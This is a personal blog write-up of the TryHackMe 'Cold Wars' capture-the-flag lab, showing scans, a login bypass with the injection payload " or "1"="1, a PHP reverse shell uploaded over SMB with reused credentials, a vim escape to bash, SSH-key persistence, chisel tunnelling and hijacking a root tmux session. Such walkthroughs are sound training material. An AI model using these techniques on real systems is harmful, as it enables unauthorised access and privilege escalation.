---
title: "TryHackMe - Cold Wars"
author: Nasrallah
description: ""
date: 2023-03-27 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, XPATH, tmux, tunneling]
img_path: /assets/img/tryhackme/coldwars
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [ColdWars](https://tryhackme.com/room/) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.182.56                                                                                                                             
Host is up (0.11s latency).                                                                                                                                   
Not shown: 996 closed tcp ports (reset)                                                                                                                       
PORT     STATE SERVICE     VERSION                                                                                                                            
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host: INCOGNITO

Host script results:
| smb2-time: 
|   date: 2023-03-26T13:43:08
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2023-03-26T13:43:08+00:00
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

There are 4 open ports, SMB is running on ports 139/445, Apache web server on port 8080 and Node.js on port 8082.

### Web

Let's navigate to the web page on port 8080.

![](1.png)

It's the default page for Apache.

Let's run a directory scan

```terminal
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.182.56:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ scans/fero.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      964w    10918c http://10.10.182.56:8080/
403      GET        9l       28w      279c http://10.10.182.56:8080/.htpasswd
403      GET        9l       28w      279c http://10.10.182.56:8080/.htaccess
301      GET        9l       28w      317c http://10.10.182.56:8080/dev => http://10.10.182.56:8080/dev/
403      GET        9l       28w      279c http://10.10.182.56:8080/dev/.htpasswd
403      GET        9l       28w      279c http://10.10.182.56:8080/dev/.htaccess
403      GET        9l       28w      279c http://10.10.182.56:8080/server-status
[####################] - 2m     40938/40938   0s      found:7       errors:348    
[####################] - 2m     20469/20469   156/s   http://10.10.182.56:8080/ 
[####################] - 2m     20469/20469   164/s   http://10.10.182.56:8080/dev/ 
```

Found a directory called `/dev` and a file called `note.txt`, let's check it out.

![](2.png)

It's forbidden. The note has the following.

```text
Secure File Upload and Testing Functionality
```

Let's go to the other web page on port 8082.

![](3.png)

Let's run a directory scan.

```terminal
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.182.56:8082/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ scans/fero2.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      125l      730w    11162c http://10.10.182.56:8082/
200      GET       28l       87w     1605c http://10.10.182.56:8082/Login
200      GET       28l       87w     1605c http://10.10.182.56:8082/login
301      GET       10l       16w      179c http://10.10.182.56:8082/static => /static/
[####################] - 2m     40938/40938   0s      found:4       errors:101    
[####################] - 1m     20469/20469   228/s   http://10.10.182.56:8082/ 
[####################] - 1m     20469/20469   223/s   http://10.10.182.56:8082/static/ 
```

We found a login page.

![](4.png)

Trying some default credentials fails but when we try doing injection we manage to get in using this payload `" or "1"="1`

![](5.png)

We got username and passwords.

### SMB

Let's list share in the SMB server.

```terminal
$ sudo smbclient -L //10.10.182.56/Dev -N                                                                                                                
                                                                               
        Sharename       Type      Comment                                      
        ---------       ----      -------                                                                                                                     
        print$          Disk      Printer Drivers                              
        SECURED         Disk      Dev                                                                                                                         
        IPC$            IPC       IPC Service (incognito server (Samba, Ubuntu))                                                                              
SMB1 disabled -- no workgroup available                                        
                                            
```

Found a share called `Secured`.

Trying to connect to the share as anonymous fails, but one of the credentials we got allows us to connect.

```terminal
$ sudo smbclient //10.10.182.56/SECURED -U ArthurMorgan
Enter WORKGROUP\ArthurMorgan's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 22 00:04:28 2021
  ..                                  D        0  Thu Mar 11 13:52:29 2021
  note.txt                            A       45  Thu Mar 11 13:19:52 2021

                7743660 blocks of size 1024. 4493072 blocks available
smb: \> get note.txt
getting file \note.txt of size 45 as note.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/CTF/THM/coldwars]
└──╼ $ cat note.txt 
Secure File Upload and Testing Functionality
```

We found the same note in the /dev directory.

## **Foothold**

Let's upload a php reverse shell.

```terminal
$ sudo smbclient //10.10.182.56/SECURED -U ArthurMorgan                                                                                              1 ⨯
[sudo] password for sirius: 
Enter WORKGROUP\ArthurMorgan's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 22 00:04:28 2021
  ..                                  D        0  Thu Mar 11 13:52:29 2021
  note.txt                            A       45  Thu Mar 11 13:19:52 2021

                7743660 blocks of size 1024. 4479268 blocks available
smb: \> put shell.php
putting file shell.php as \shell.php (10.2 kb/s) (average 10.2 kb/s)
smb: \> ls
  .                                   D        0  Sun Mar 26 14:30:14 2023
  ..                                  D        0  Thu Mar 11 13:52:29 2021
  note.txt                            A       45  Thu Mar 11 13:19:52 2021
  shell.php                           A     3650  Sun Mar 26 14:30:14 2023

                7743660 blocks of size 1024. 4479264 blocks available
smb: \> 

```

Now we request the shell at `http://10.10.182.56:8080/dev/shell.php`

![](6.png)

We see use `marston` has multiple tmux windows, one of them is logged on as root with the password `zzzzzzzzzzzzzzzzzzzzzzzz`.

We can switch to user `ArthurMorgan` using his original password.

## **Privilege Escalation**

Running linpeas we see ssh listening on localhost.

![](7.png)

Checking environment variable we find the following:

```terminal
[...]
OPEN_PORT=4545
[...]
```

By listening on that port, we get this:

```terminal
ArthurMorgan@incognito:~$ nc -lvnp 4545                                                                                                                       
Listening on [0.0.0.0] (family 0, port 4545)                                                                                                                  
Connection from 127.0.0.1 52606 received!                                                                                                                     
                                                                                                                                                              
                                                                                                                                                              
ideaBox                                                                                                                                                       
1.Write                                                                                                                                                       
2.Delete                                                                                                                                                      
3.Steal others' Trash                                                                                                                                         
4.Show'nExit         
```

After playing a little bit with the options, we find that option 4 prompts us to vim, and by running `:!/bin/bash` we get a shell as `marston`.

![](8.png)

I copied my public ssh key to authorized_keys, forwarded port 22 using `chisel` and ssh'd to the target as `marston`.

We saw earlier that marston is using tmux so let's see what session are there using `tmux ls`

```terminal
marston@incognito:~$ tmux ls                                                                                                                           [0/548]
0: 9 windows (created Sun Mar 26 16:45:35 2023) [80x24] 
```

We found one session called `0` with 9 windows.

Let's attach to it with `tmux attach -t 0`

![](9.png)

We found the window that logged in as root.


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
